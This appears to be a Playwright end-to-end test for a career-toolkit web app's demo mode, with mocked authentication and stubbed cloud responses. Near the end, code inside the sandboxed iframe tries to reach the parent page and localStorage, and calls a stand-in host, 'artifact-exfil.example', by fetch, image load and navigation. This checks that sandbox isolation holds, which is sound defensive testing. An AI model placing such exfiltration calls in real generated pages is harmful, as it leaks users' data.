// Optional browser verification against a built export. All account traffic is fictional.
const {chromium}=await import(process.env.LOOKOUT_PLAYWRIGHT_MODULE||'../runner/node_modules/playwright/index.mjs');
import assert from 'node:assert/strict';
import {mkdir} from 'node:fs/promises';
const dir=process.env.LOOKOUT_UI_ARTIFACTS||'/private/tmp/career-artifacts-ui';await mkdir(dir,{recursive:true});
const base=process.env.LOOKOUT_UI_URL||'http://127.0.0.1:3041';
const browser=await chromium.launch({executablePath:process.env.LOOKOUT_CHROMIUM_EXECUTABLE||'/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',headless:true});
const errors=[],cloud=[],leaks=[];
try{
 const context=await browser.newContext({viewport:{width:1440,height:1000},colorScheme:'dark',serviceWorkers:'block'});
 const user={id:'11111111-1111-1111-1111-111111111111',aud:'authenticated',role:'authenticated',email:'fictional@example.com',app_metadata:{demo_preview:true},user_metadata:{},is_anonymous:false};
 const b64=v=>Buffer.from(JSON.stringify(v)).toString('base64url');const token=b64({alg:'HS256',typ:'JWT'})+'.'+b64({sub:user.id,aud:'authenticated',role:'authenticated',exp:Math.floor(Date.now()/1000)+3600})+'.fictional';
 await context.addInitScript(({user,token})=>{if(window.parent===window)localStorage.setItem('sb-osyrlausutnqzlegxmnd-auth-token',JSON.stringify({access_token:token,refresh_token:'fictional',expires_at:Math.floor(Date.now()/1000)+3600,expires_in:3600,token_type:'bearer',user}));},{user,token});
 await context.route('https://osyrlausutnqzlegxmnd.supabase.co/**',async route=>{cloud.push(route.request().url());const url=route.request().url();const body=url.includes('/auth/v1/user')?user:url.includes('/rpc/artifact_action')?{items:[],nextOffset:null}:[];await route.fulfill({status:200,contentType:'application/json',headers:{'Access-Control-Allow-Origin':'*','Content-Range':'0-0/0'},body:JSON.stringify(body)});});
 // Requests here would be an isolation failure. Block them even if a regression occurs.
 await context.route('https://artifact-exfil.example/**',async route=>{leaks.push(route.request().url());await route.abort();});
 const page=await context.newPage();page.on('pageerror',e=>errors.push(e.message));
 await page.goto(base+'/career-toolkit/');await page.waitForLoadState('networkidle');
 await page.getByRole('button',{name:'Open profile navigation'}).click();await page.getByRole('button',{name:'Demo mode',exact:true}).click();
 await page.getByRole('heading',{name:'When does an index help?',exact:true}).waitFor();
 await page.waitForLoadState('networkidle');
 const initialCloud=cloud.length;
 if(process.env.LOOKOUT_UI_SCREENSHOTS!=='false')await page.screenshot({path:dir+'/workspace-desktop.png',fullPage:true});
 await page.setViewportSize({width:390,height:844});await page.waitForTimeout(350);await page.evaluate(()=>scrollTo(0,0));if(process.env.LOOKOUT_UI_SCREENSHOTS!=='false')await page.screenshot({path:dir+'/workspace-mobile-dark.png',fullPage:true});assert(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth+1));
 await page.emulateMedia({colorScheme:'light'});await page.waitForTimeout(350);if(process.env.LOOKOUT_UI_SCREENSHOTS!=='false')await page.screenshot({path:dir+'/workspace-mobile-light.png',fullPage:true});
 await page.setViewportSize({width:1440,height:1400});await page.waitForTimeout(350);await page.evaluate(()=>scrollTo(0,0));assert(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth+1));if(process.env.LOOKOUT_UI_SCREENSHOTS!=='false')await page.screenshot({path:dir+'/workspace-desktop-light.png'});await page.setViewportSize({width:1440,height:1000});
 await page.emulateMedia({colorScheme:'dark'});await page.waitForTimeout(350);


 const featured=page.getByRole('region',{name:'Prepared for you',exact:true});
 assert.equal(await featured.getByRole('link').count(),1);assert.equal(await featured.getByText('When does an index help?',{exact:true}).count(),0);
 await featured.getByRole('link').click();
 const collection=page.getByRole('region',{name:'Collection materials'});await collection.getByRole('heading',{name:'Interview answer writers: fictional sample',exact:true}).waitFor();
 assert.equal(await page.getByRole('navigation',{name:'In this collection'}).getByRole('link').count(),3);
 assert.match(await page.getByRole('navigation',{name:'In this collection'}).innerText(),/Cedar Systems: interview research brief[\s\S]*Interview answer writers[\s\S]*When does an index help/);
 await collection.locator('iframe').scrollIntoViewIfNeeded();await collection.frameLocator('iframe').getByRole('heading',{name:'When does an index help?'}).waitFor();await page.evaluate(()=>scrollTo(0,0));
 if(process.env.LOOKOUT_UI_SCREENSHOTS!=='false')await page.screenshot({path:dir+'/collection-desktop.png',fullPage:true});
 await page.setViewportSize({width:390,height:844});await page.emulateMedia({colorScheme:'light'});if(process.env.LOOKOUT_UI_SCREENSHOTS!=='false')await page.screenshot({path:dir+'/collection-mobile.png',fullPage:true});assert(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth+1));
 await page.setViewportSize({width:1440,height:1000});await page.emulateMedia({colorScheme:'dark'});
 await page.getByRole('button',{name:'Discuss with my agent'}).click();assert.match(await page.getByLabel('Artifact reference').inputValue(),/ordered materials at their exact saved revisions/);
 await page.getByRole('link',{name:'Back to workspace'}).click();
 await page.getByRole('link').filter({has:page.getByRole('heading',{name:'When does an index help?',exact:true})}).click();
 await page.getByRole('article',{name:'Saved artifact',exact:true}).waitFor();assert.equal(await page.getByRole('article',{name:'Saved artifact',exact:true}).count(),1);assert.equal(await page.getByRole('region',{name:'Collection materials'}).count(),0);
 const frame=page.frameLocator('iframe');await frame.getByRole('heading',{name:'When does an index help?'}).waitFor();
 await frame.getByLabel('Matching rows:').evaluate(el=>{el.value='80';el.dispatchEvent(new Event('input',{bubbles:true}));});
 await frame.getByText('165 units',{exact:true}).waitFor();await page.waitForTimeout(250);await frame.getByRole('button',{name:'Reveal explanation'}).click();assert(await frame.locator('#answer').isVisible());
 if(process.env.LOOKOUT_UI_SCREENSHOTS!=='false')await page.screenshot({path:dir+'/interactive-desktop.png',fullPage:true});
 await page.getByRole('button',{name:'Discuss with my agent'}).click();const reference=await page.getByLabel('Artifact reference').inputValue();assert.match(reference,/22222222-aaaa-4000-8000-222222222222/);assert.match(reference,/version 1/);
 const contentFrame=page.frames().find(f=>f.parentFrame());
 const protection=await contentFrame.evaluate(async()=>{let parentDenied=false,storageDenied=false,fetchDenied=false;try{void parent.document.body.innerHTML;}catch{parentDenied=true;}try{localStorage.setItem('escape','x');}catch{storageDenied=true;}try{await fetch('https://artifact-exfil.example/fetch');}catch{fetchDenied=true;}const img=new Image();img.src='https://artifact-exfil.example/image';document.body.append(img);return {parentDenied,storageDenied,fetchDenied};});
 assert.deepEqual(protection,{parentDenied:true,storageDenied:true,fetchDenied:true});
 await contentFrame.evaluate(()=>{location.href='https://artifact-exfil.example/navigation';});
 await page.waitForTimeout(250);assert.deepEqual(leaks,[],'Generated HTML made an external request');
 await page.getByRole('button',{name:'Restart activity'}).click();await frame.getByText('25 units',{exact:true}).waitFor();
 await page.getByText('Material details',{exact:true}).click();await page.getByRole('button',{name:'Archive',exact:true}).click();await page.getByText('Archived · still readable',{exact:true}).waitFor();await page.getByText('Material details',{exact:true}).click();await page.getByRole('button',{name:'Restore to workspace'}).click();await page.getByText('Material details',{exact:true}).click();await page.locator('span').filter({hasText:/^Version 3$/}).waitFor();
 await page.getByLabel('Artifact revision').selectOption('1');await page.getByText('Saved revision',{exact:true}).waitFor();await frame.getByRole('heading',{name:'When does an index help?'}).waitFor();
 await page.setViewportSize({width:390,height:844});await page.emulateMedia({colorScheme:'light'});await page.locator('iframe').scrollIntoViewIfNeeded();await page.waitForTimeout(350);await page.evaluate(()=>scrollTo(0,0));await page.waitForTimeout(100);if(process.env.LOOKOUT_UI_SCREENSHOTS!=='false')await page.locator('iframe').screenshot({path:dir+'/interactive-mobile.png'});assert(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth+1));
 await page.getByRole('link',{name:'Back to workspace'}).click();await page.getByLabel('Search artifacts').fill('Cedar');await page.getByRole('heading',{name:'Cedar Systems: interview research brief',exact:true}).waitFor();await page.getByRole('link').filter({has:page.getByRole('heading',{name:'Cedar Systems: interview research brief',exact:true})}).click();await page.getByRole('heading',{name:'Your matching evidence',exact:true}).waitFor();if(process.env.LOOKOUT_UI_SCREENSHOTS!=='false')await page.screenshot({path:dir+'/research-mobile.png',fullPage:true});assert(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth+1));
 await page.setViewportSize({width:1440,height:1000});
 await page.getByRole('link',{name:/^Action board/}).click();await page.getByRole('heading',{name:'Weekly prep',exact:true}).waitFor();
 await page.locator('.prep-session details').evaluateAll(els=>els.forEach(el=>el.open=true));
 await page.getByRole('link',{name:'Open When does an index help?',exact:true}).first().waitFor();
 assert(await page.getByText('Supporting material hasn’t been prepared yet.',{exact:true}).count());
 await page.setViewportSize({width:1440,height:1000});if(process.env.LOOKOUT_UI_SCREENSHOTS!=='false')await page.screenshot({path:dir+'/planner-desktop.png',fullPage:true});
 assert.equal(cloud.length,initialCloud,'Demo interactions called real account services: '+cloud.slice(initialCloud).join('\n'));assert.equal(errors.length,0,errors.join('\n'));
 console.log(JSON.stringify({status:'passed',artifacts:dir,checks:['prepared-only featured shelf','compact saved list','ordered scrollable collection','pinned collection discussion','desktop/mobile','interactive slider and explanation','exact revision discussion','archive/restore/history','research reading','task artifact links','missing material','sandbox parent/storage/fetch/image/navigation isolation','demo account isolation','no page errors']}));
}finally{await browser.close();}
